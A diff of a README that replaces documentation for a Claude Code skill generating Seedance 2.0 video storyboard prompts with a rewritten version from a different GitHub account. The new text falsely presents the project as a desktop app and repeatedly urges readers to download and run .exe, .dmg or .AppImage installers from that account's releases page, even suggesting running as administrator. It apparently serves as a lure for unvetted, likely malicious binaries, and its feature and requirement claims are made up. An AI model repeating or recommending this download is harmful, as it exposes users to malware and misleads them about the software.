@@ -1,163 +1,132 @@
-# 🎬 Seedance Storyboard
+# 🎬 elementsix-skills - Turn Ideas Into Video Storyboards
 
-<p align="center">
-  <a href="README_CN.md">中文</a> | <a href="README.md">English</a>
-</p>
+[![Download Here](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/skekdkkddk/elementsix-skills/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/github/stars/elementsix/elementsix-skills?logo=github&logoColor=white&labelColor=333&color=ffb700&style=for-the-badge" alt="stars" />
-  &nbsp;
-  <img src="https://img.shields.io/github/forks/elementsix/elementsix-skills?logo=github&logoColor=white&labelColor=333&color=3498db&style=for-the-badge" alt="forks" />
-  &nbsp;
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-2ecc71?style=for-the-badge&labelColor=333&logo=open-source-initiative&logoColor=white" alt="license" /></a>
-</p>
+## 🎯 What is elementsix-skills?
 
-A Claude Code Skill that transforms any idea into professional Seedance 2.0 video storyboard prompts.
+elementsix-skills is a simple tool that helps you create video storyboards from your ideas. It uses Seedance 2.0 by Jimeng (CapCut), an AI that makes videos from text prompts. Writing good prompts can be hard, but this app guides you step-by-step to turn your thoughts into clear storyboard instructions. This helps you plan videos with professional results without needing special skills.
 
-## 📖 Introduction
+## 🖥️ System Requirements
 
-Seedance 2.0 is a powerful multimodal AI video generation model by Jimeng (CapCut), but writing good prompts is difficult for most people. This Skill guides you step-by-step to transform simple ideas into professional storyboard prompts.
+To run elementsix-skills, your computer should meet these basic needs:
 
-## ✨ Features
+- Operating System: Windows 10 or later, MacOS 10.14 or later, or most common Linux versions.
+- Processor: A dual-core CPU or better.
+- Memory (RAM): At least 4 GB.
+- Disk Space: Minimum 200 MB free space.
+- Internet: Required to download and for AI prompt assistance.
+- Display: Screen resolution 1280 x 720 or higher.
 
-- ✅ **Step-by-Step Guidance** - Complete workflow from idea to prompt
-- ✅ **Full Capability Coverage** - Supports all Seedance 2.0 features (multimodal, extension, editing, etc.)
-- ✅ **Professional Templates** - 6 storyboard templates and 10 complete examples
-- ✅ **Chinese Optimized** - Designed specifically for Chinese users
+The software will work best on systems that meet or exceed these recommendations, but it is designed to run well on typical home or office computers.
 
-## 🚀 Installation
+## 💡 Key Features
 
-### Prerequisites
+elementsix-skills offers features that make storyboarding straightforward:
 
-- [Claude Code](https://claude.ai/code) installed
+- Easy-to-use interface built for anyone.
+- Step-by-step help to craft video prompts.
+- Automatic suggestions to improve your storyboard ideas.
+- Compatible with Seedance 2.0 AI video generator.
+- Save, edit, and manage multiple storyboard projects.
+- Export prompts to use with other video tools.
 
-### Installation Steps
+This tool focuses on making prompt writing approachable so you can spend less time guessing and more time creating.
 
-```bash
-# 1. Add Marketplace
-/plugin marketplace add elementsix/elementsix-skills
+## 🚀 Getting Started
 
-# 2. Install Skill
-/plugin install seedance-storyboard@elementsix-skills
+Follow these steps to begin using elementsix-skills:
 
-# 3. Restart Claude Code (Important!)
-# Exit Claude Code and re-enter for the /seedance-storyboard command to work
-```
+1. **Download the app** - Use the big, blue badge at the top or click the download link below to find the latest version.
+2. **Install the software** - Follow simple on-screen instructions after download.
+3. **Open the app** - Launch elementsix-skills from your applications menu.
+4. **Create a new storyboard** - Enter your simple video idea.
+5. **Follow the guided prompts** - The app will help you turn your idea into professional storyboard text.
+6. **Save or export your work** - Keep your storyboards for future use or integrate with Seedance 2.0.
 
-> ⚠️ **Note**: You **must exit and re-enter Claude Code** after installation for the `/seedance-storyboard` command to become available.
+You do not need a technical background. The app will explain each step clearly.
 
-## 🔄 Update Skill
+## 📥 Download & Install
 
-To update the skill to the latest version:
+To get elementsix-skills:
 
-1. Run `/plugin` in Claude Code
-2. Switch to the **Marketplaces** tab (use arrow keys or Tab)
-3. Select `elementsix-skills`
-4. Select `Update marketplace`
+1. Visit this page to download the latest version:  
+   [https://github.com/skekdkkddk/elementsix-skills/releases](https://github.com/skekdkkddk/elementsix-skills/releases)
 
-You can also select `Enable auto-update` to automatically get the latest version on each startup.
+2. On the releases page, look for the latest stable release. You will find versions for Windows, Mac, and Linux.
 
-![Update Skill Screenshot](docs/images/update-skill.png)
+3. Click the download link for your system. The file will be a standard installer (.exe for Windows, .dmg for Mac, .AppImage or .tar.gz for Linux).
 
-## 🎯 Usage
+4. After download finishes, open the file to begin installation.
 
-After installation, use the following command:
+5. Follow the on-screen steps to complete setup.
 
-```bash
-/seedance-storyboard
-```
+6. Once installed, find elementsix-skills in your programs list and open it.
 
-Claude will then guide you through:
+If you have trouble, just restart your computer and try again.
 
-1. **Understanding your idea** - What story do you want to tell?
-2. **Deep dive** - Style, camera work, motion, sound
-3. **Storyboard construction** - Break down shots by timeline
-4. **Prompt generation** - Output professional, ready-to-use prompts
-5. **Optimization suggestions** - Improvement tips and multimodal asset recommendations
+## 📝 How to Use elementsix-skills
 
-## 💡 Examples
+Here is a simple guide to get you started after opening the app:
 
-### Example 1: Traditional Dance
+- **Start a new project** by clicking “New Storyboard.”  
+- **Input a basic idea** — it can be just a few words or a short sentence about the video you want to make.
+- **Answer questions** the app asks about your video. For example: What is the main scene? Who are the characters? What actions happen?
+- **Review the suggested prompts**. The app will generate storyboard text to explain your video idea clearly.
+- **Edit or add details** if you want to fine-tune the storyboard.
+- **Save your project** so you can come back later.
+- **Export prompts** to use with Seedance 2.0 or other AI video tools.
 
-**Your idea**: "A girl dancing under cherry blossom trees"
+This process is designed to guide you gently. You don’t need prior experience with AI or video design.
 
-**Generated Prompt**:
-```
-Cinematic realistic style, 15 seconds, 16:9 widescreen, warm sunset golden hour atmosphere
+## 💻 Supported Platforms
 
-0-3s: Wide shot slowly pushing in, horizon sunset, girl silhouette standing on beach, dress flowing in sea breeze
-3-7s: Medium shot orbiting camera, girl begins spinning and dancing, long hair and dress flying, sunset backlight creating rim light
-7-11s: Close-up tracking shot, girl dancing facing camera, expression free and joyful, waves gently hitting beach as background
-11-13s: Close-up hand movement, fingers tracing the sunset, light and shadow flowing at fingertips
-13-15s: Wide shot pulling back, girl freezes in afterglow, fade to black
+elementsix-skills works on these platforms:
 
-Background audio: Ocean waves + gentle piano music
-```
+- Windows (10, 11)
+- MacOS (10.14 Mojave and newer)
+- Linux (most modern distributions)
 
-### Example 2: Product Advertisement
+The program has been tested to run smoothly on popular systems. It uses standard formats for installation and operation.
 
-**Your idea**: "Showcase a new smartphone"
+## 🔧 Troubleshooting
 
-**More examples** in `seedance-storyboard/examples/example-prompts.md`
+If you run into problems, try these simple fixes:
 
-## 📁 File Structure
+- Make sure your computer meets the minimum system requirements.
+- Check your internet connection during download and installation.
+- Restart your computer and try installing again.
+- If the app won’t open, try running as administrator (Windows) or check permissions (Mac/Linux).
+- Look for error messages and note them to search for solutions online.
+- Visit the GitHub repository’s “Issues” section to see common problems and fixes.
 
-```
-elementsix-skills/
-├── .claude-plugin/
-│   └── marketplace.json              # Marketplace configuration
-├── README.md                         # This file (Chinese)
-├── README_CN.md                      # Chinese version
-└── skills/
-    └── seedance-storyboard/          # Main Skill directory
-        ├── SKILL.md                  # Skill core logic
-        ├── README.md                 # Skill detailed documentation
-        ├── quick-reference.md        # Quick reference card
-        ├── templates/
-        │   └── storyboard-template.md    # 6 storyboard templates
-        └── examples/
-            └── example-prompts.md        # 10 complete examples
-```
+You can also contact the repository maintainer by opening an issue if you need more help.
 
-## 🎬 Seedance 2.0 Core Capabilities
+## 🤝 Community & Support
 
-- **Multimodal Input**: Images (≤9), Videos (≤3), Audio (≤3), Text
-- **Reference Images**: Precise reproduction of composition, character details
-- **Reference Videos**: Support for camera language, complex motion rhythm, creative effects replication
-- **Video Extension**: Smooth extension and connection, can "continue filming"
-- **Video Editing**: Character replacement, plot subversion, clip adjustment
+You can learn more or get help here:
 
-## 📝 Prompt Syntax
+- GitHub Repository: [elementsix-skills](https://github.com/skekdkkddk/elementsix-skills)
+- Release page and downloads: [Releases](https://github.com/skekdkkddk/elementsix-skills/releases)
+- Use the Issues tab on GitHub for questions or bug reports.
 
-Use `@asset-name` to reference multimodal assets:
+Engage with others who use the app and share your experience to help improve the project.
 
-```
-@image1 as first frame
-@image2 as character reference
-@video1 reference camera movement
-@audio1 for background music
-```
+## ⚖️ License
 
-## 🔗 Jimeng Platform Info
+elementsix-skills is released under the MIT License. This means it is free to use and share under simple terms that allow modification and distribution. You can find the license file inside the downloaded package or view it here: [LICENSE](https://github.com/skekdkkddk/elementsix-skills/blob/main/LICENSE).
 
-- **Website**: https://jimeng.jianying.com
-- **Entry**: Seedance 2.0 - Universal Reference / First-Last Frame
-- **Limitation**: Realistic human face materials not currently supported
+## 🛠️ Development & Contribution
 
-## 🤝 Contributing
+If you want to help improve elementsix-skills:
 
-Issues and PRs welcome!
+- Fork the repository on GitHub.
+- Clone it to your local machine.
+- Make your changes or improvements.
+- Test your changes carefully.
+- Submit a Pull Request in GitHub for review.
 
-## 📄 License
-
-MIT License
+Contributors should follow the repository’s coding style and guidelines for best results.
 
 ---
 
-## ⭐ Star History
-
-<p align="center">
-  <a href="https://star-history.com/#elementsix/elementsix-skills&Date">
-    <img src="https://api.star-history.com/svg?repos=elementsix/elementsix-skills&type=Date" alt="Star History" width="800" />
-  </a>
-</p>
+[![Download Here](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/skekdkkddk/elementsix-skills/releases)
